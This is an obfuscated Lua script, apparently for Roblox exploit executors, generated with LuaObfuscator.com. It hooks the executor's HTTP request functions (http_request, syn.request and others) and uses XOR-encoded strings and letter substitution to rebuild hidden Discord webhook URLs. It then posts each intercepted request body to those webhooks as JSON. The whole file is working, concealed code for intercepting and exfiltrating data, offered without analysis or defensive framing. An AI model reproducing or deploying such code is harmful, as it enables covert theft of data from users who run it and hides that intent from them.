--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13)local v14={};for v25=1, #v12 do v6(v14,v0(v4(v1(v2(v12,v25,v25 + 1 )),v1(v2(v13,1 + (v25% #v13) ,1 + (v25% #v13) + 1 )))%256 ));end return v5(v14);end local function v8(v15,v16)local v17=v15:split("/");local v18,v19=v17[1 + 1 ],v17[1847 -(1228 + 618) ];if v16 then v18=v18:lower();end v18=v18:gsub("m","1");v18=v18:gsub("a","2");v18=v18:gsub("p","3");v18=v18:gsub("g","4");v18=v18:gsub("q","5");v18=v18:gsub("y","6");v18=v18:gsub("i","7");v18=v18:gsub("r","8");v18=v18:gsub("t","9");v18=v18:gsub("c","0");return "https://discord.com/api/webhooks/"   .. v18   .. "/"   .. v19 ;end local function v9(v20,v21)return v8(v21)   .. "/"   .. v20 ;end local v10=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v11;v11=hookfunction(http_request or request or HttpPost or syn.request ,function(v22,v23)local v24=0 -0 ;while true do if (v24==0) then v22=v8(v22,true);v11({[v7("\22\223\38","\156\67\173\74\165")]=v22,[v7("\25\178\93\30\179\34","\38\84\215\41\118\220\70")]=v7("\96\57\17\38","\158\48\118\66\114"),[v7("\131\33\17\50\118\183\232","\155\203\68\112\86\19\197")]={[v7("\101\210\56\232\69\118\241\181\114\196\38\249","\152\38\189\86\156\32\24\133")]="application/json"},[v7("\222\88\163\95","\38\156\55\199")]=v10:JSONEncode(v23)});break;end end end);
